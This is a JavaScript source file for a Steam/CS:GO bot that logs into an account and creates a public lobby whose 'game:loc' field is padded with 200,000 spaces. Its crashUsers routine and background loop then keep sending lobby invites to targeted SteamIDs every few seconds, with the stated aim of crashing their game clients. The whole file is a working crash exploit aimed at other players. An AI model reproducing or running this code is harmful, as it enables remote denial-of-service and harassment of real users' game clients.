const SteamUser = require("steam-user");
const SteamID = require("steamid");
const Coordinator = require("./Coordinator.js");
const VDF = require("./VDF.js");
const Helper = require("./Helper.js");

module.exports = class Lobby {
	constructor() {
		// Lobby settings
		this.lobbySettings = {};

		// Crashing
		this.crashLoop = [];
		(async () => {
			while (true) {
				await new Promise(p => setTimeout(p, 3000));

				if (!this.lobbySettings.id) {
					continue;
				}

				// First we find the ones which we want to remove and the ones we want to crash
				let remove = [];
				let toCrash = [];
				for (let target of this.crashLoop) {
					if (Date.now() >= target.end) {
						remove.push(target.steamid);
						continue;
					}

					toCrash.push(target.steamid);
				}

				// Now we remove the ones who are irrelevant!
				for (let r of remove) {
					let index = this.crashLoop.find(s => s.steamid === r);
					if (index <= -1) {
						continue;
					}

					this.crashLoop.splice(index, 1);
				}

				// And crash the ones who have to die
				if (toCrash.length > 0) {
					await this.crashUsers(toCrash);
				}
			}
		})();

		// Instances
		this.steam = new SteamUser();
		this.coordinator = new Coordinator(this.steam);
	}

	_login(details) {
		this.steamDetails = details;

		return new Promise((resolve, reject) => {
			let loggedOn = () => {
				this.steam.removeListener("loggedOn", loggedOn);
				this.steam.removeListener("error", error);
				this.steam.removeListener("steamGuard", steamGuard);

				this.steam.requestFreeLicense([730]);
				this.steam.setPersona(SteamUser.EPersonaState.Online);

				// Bad ping check and restart CSGO if needed
				this.csgoHeartbeat = setInterval(async () => {
					// Do not run this if we have already figured out we're offline
					let res = await this.coordinator.sendMessage(
						730,
						this.coordinator.Protos.csgo.EGCBaseClientMsg.k_EMsgGCClientHello,
						{},
						this.coordinator.Protos.csgo.CMsgClientHello,
						{},
						this.coordinator.Protos.csgo.EGCBaseClientMsg.k_EMsgGCClientWelcome,
						this.coordinator.Protos.csgo.CMsgClientWelcome,
						2500
					).catch(() => { });

					if (res) {
						// We're connected, nothing to do
						return;
					}

					// Lets do some stuff
					clearInterval(this.csgoHeartbeat);
					this.steam.logOff();

					await new Promise(p => setTimeout(p, 500));

					let logon = undefined;
					while (!logon) {
						logon = await this.createLobby(this.steamDetails).catch((err) => {
							console.error(err);
						});
						if (!logon) {
							this.steam.logOff();
							await new Promise(p => setTimeout(p, 2000));
						}
					}

					// We are now logged on again and this loop should be running again
				}, 5000);

				resolve(true);
			}

			let error = (err) => {
				this.steam.removeListener("loggedOn", loggedOn);
				this.steam.removeListener("error", error);
				this.steam.removeListener("steamGuard", steamGuard);

				reject(err);
			}

			let steamGuard = () => {
				this.steam.removeListener("loggedOn", loggedOn);
				this.steam.removeListener("error", error);
				this.steam.removeListener("steamGuard", steamGuard);

				reject(new Error("Steam Guard required"));
			}

			this.steam.on("loggedOn", loggedOn);
			this.steam.on("error", error);
			this.steam.on("steamGuard", steamGuard);

			this.steam.logOn(details);
		});
	}

	createLobby(details = undefined) {
		return new Promise(async (resolve, reject) => {
			// First we log into Steam if we haven't already
			if (!this.steam.steamID) {
				if (!details) {
					reject(new Error("No details provide for Steam login"));
					return;
				}

				let loginSuccess = await this._login(details).catch(reject);
				if (!loginSuccess) {
					return;
				}
			}

			// Start CSGO and establish coordinator response
			this.steam.gamesPlayed([730]);

			let errGcWelcome = 0;
			this.gcWelcome = undefined;
			while (true) {
				this.gcWelcome = await this.coordinator.sendMessage(
					730,
					this.coordinator.Protos.csgo.EGCBaseClientMsg.k_EMsgGCClientHello,
					{},
					this.coordinator.Protos.csgo.CMsgClientHello,
					{},
					this.coordinator.Protos.csgo.EGCBaseClientMsg.k_EMsgGCClientWelcome,
					this.coordinator.Protos.csgo.CMsgClientWelcome,
					2000
				).catch(() => { });

				if (this.gcWelcome) {
					break;
				}

				errGcWelcome += 1;

				if (errGcWelcome > 10 /* 2 times 10 = 20 seconds to connect */) {
					reject(new Error("Failed to establish GameCoordinator connection"));
					return;
				}
			}
			// From now on we should not need to loop any request anymore as the game has fully established connection

			// Lets get a matchmaking hello so we can properly set everything required
			this.gcMatchmaking = await this.coordinator.sendMessage(
				730,
				this.coordinator.Protos.csgo.ECsgoGCMsg.k_EMsgGCCStrike15_v2_MatchmakingClient2GCHello,
				{},
				this.coordinator.Protos.csgo.CMsgGCCStrike15_v2_MatchmakingClient2GCHello,
				{},
				this.coordinator.Protos.csgo.ECsgoGCMsg.k_EMsgGCCStrike15_v2_MatchmakingGC2ClientHello,
				this.coordinator.Protos.csgo.CMsgGCCStrike15_v2_MatchmakingGC2ClientHello,
				2000
			).catch(reject);

			if (!this.gcMatchmaking) {
				return;
			}

			// If a lobby already exists under our name try to leave it to ensure its all up-to-date
			if (this.lobbySettings.id) {
				await this.coordinator.sendMessage(
					undefined,
					6605,
					{
						steamid: this.steam.steamID.getSteamID64(),
						client_sessionid: this.steam._sessionID,
						routing_appid: 730
					},
					this.coordinator.Protos.steam.CMsgClientMMSLeaveLobby,
					{
						app_id: 730,
						steam_id_lobby: this.lobbySettings.id.toString()
					},
					6606,
					this.coordinator.Protos.steam.CMsgClientMMSLeaveLobbyResponse,
					2000
				).catch(() => { });

				// We don't care about the response, either we just left a lobby or were never in one
			}

			// Create the actual lobby on Steam
			let lobbyCreate = await this.coordinator.sendMessage(
				undefined,
				6601,
				{
					steamid: this.steam.steamID.getSteamID64(),
					client_sessionid: this.steam._sessionID,
					routing_appid: 730
				},
				this.coordinator.Protos.steam.CMsgClientMMSCreateLobby,
				{
					app_id: 730,
					max_members: 1,
					lobby_type: 1,
					lobby_flags: 1,
					cell_id: this.steam.cellID,
					public_ip: Helper.IPStrToInt(this.steam.publicIP),
					persona_name_owner: this.steam.accountInfo.name
				},
				6602,
				this.coordinator.Protos.steam.CMsgClientMMSCreateLobbyResponse,
				3000
			).catch(reject);

			if (!lobbyCreate) {
				return;
			}

			if (lobbyCreate.eresult !== 1) {
				reject(new Error("Invalid EResult for creating lobby: " + lobbyCreate.eresult));
				return;
			}

			this.lobbySettings = {
				id: new SteamID(lobbyCreate.steam_id_lobby.toString())
			}

			let mapgroups = ["mg_de_mirage", "mg_de_inferno", "mg_de_overpass", "mg_de_vertigo", "mg_de_nuke", "mg_de_train", "mg_de_dust2"];

			await this.updateLobbyData({
				"game:apr": "1",
				"game:ark": "180",
				"game:loc": "death.png" + " ".repeat(200000),
				"game:map": mapgroups[0].replace("mg_", ""),
				"game:mapgroupname": mapgroups.join(","),
				"game:mode": "cooperative",
				"game:prime": "1",
				"game:search_key": "k13711",
				"game:state": "lobby",
				"game:type": "classic",
				"members:numMachines": "2",
				"members:numPlayers": "2",
				"members:numSlots": "10",
				"options:action": "custommatch",
				"options:anytypemode": "0",
				"options:server": "official",
				"system:access": "public",
				"system:network": "LIVE",
				"uids": [
					this.steam.steamID,
					SteamID.fromIndividualAccountID(22202)
				]
			}, 10, 1, 1).catch(() => { });

			resolve({
				gcWelcome: this.gcWelcome,
				gcMatchmaking: this.gcMatchmaking
			});
		});
	}

	updateLobbyData(customs, maxMembers = 10, lobbyType = 1, lobbyFlags = 1) {
		return new Promise((resolve, reject) => {
			if (!this.lobbySettings.id) {
				reject(new Error("Lobby has not yet been created"));
				return;
			}

			// Create defaults
			let defaults = this.lobbySettings.csgo || {
				"game:apr": "1",
				"game:ark": "130",
				"game:loc": "DE",
				"game:map": "de_mirage",
				"game:mapgroupname": "mg_de_mirage,mg_de_inferno,mg_de_overpass,mg_de_vertigo,mg_de_nuke,mg_de_train,mg_de_dust2",
				"game:mode": "competitive",
				"game:prime": "1",
				"game:search_key": "k13710",
				"game:state": "lobby",
				"game:type": "classic",
				"members:numMachines": "1",
				"members:numPlayers": "1",
				"members:numSlots": "10",
				"options:action": "custommatch",
				"options:anytypemode": "0",
				"options:server": "official",
				"system:access": "private",
				"system:network": "LIVE",
				"uids": [
					this.steam.steamID
				]
			};

			let obj = {};

			// Combine customs with defaults
			for (let key in defaults) {
				obj[key] = defaults[key];
			}

			for (let key in customs) {
				obj[key] = customs[key];
			}

			this.lobbySettings.csgo = obj;

			// Now we normalize it to only allow strings
			for (let key in obj) {
				if (typeof obj[key] === "object") {
					continue;
				}

				obj[key] = obj[key].toString();
			}

			// Finally send it as update to the game
			this.coordinator.sendMessage(
				undefined,
				6609,
				{
					steamid: this.steam.steamID.getSteamID64(),
					client_sessionid: this.steam._sessionID,
					routing_appid: 730
				},
				this.coordinator.Protos.steam.CMsgClientMMSSetLobbyData,
				{
					app_id: 730,
					steam_id_lobby: this.lobbySettings.id.getSteamID64(),
					steam_id_member: "0",
					max_members: maxMembers,
					lobby_type: lobbyType,
					lobby_flags: lobbyFlags,
					metadata: VDF.encode(obj, [0x00, 0x00], [0x08], { uids: Helper.encodeUids }).toBuffer()
				},
				6610,
				this.coordinator.Protos.steam.CMsgClientMMSSetLobbyDataResponse,
				5000
			).then(resolve).catch(reject);
		});
	}

	crashUsers(steamIDs) {
		return new Promise(async (resolve, reject) => {
			// Crash the users on our list
			for (let steamid of steamIDs) {
				this.coordinator.sendMessage(
					undefined,
					6621,
					{
						steamid: this.steam.steamID.getSteamID64(),
						client_sessionid: this.steam._sessionID,
						routing_appid: 730
					},
					this.coordinator.Protos.steam.CMsgClientMMSInviteToLobby,
					{
						app_id: 730,
						steam_id_lobby: this.lobbySettings.id.getSteamID64(),
						steam_id_user_invited: steamid
					},
					undefined,
					undefined,
					5000
				);
			}

			resolve(true);
		});
	}
}
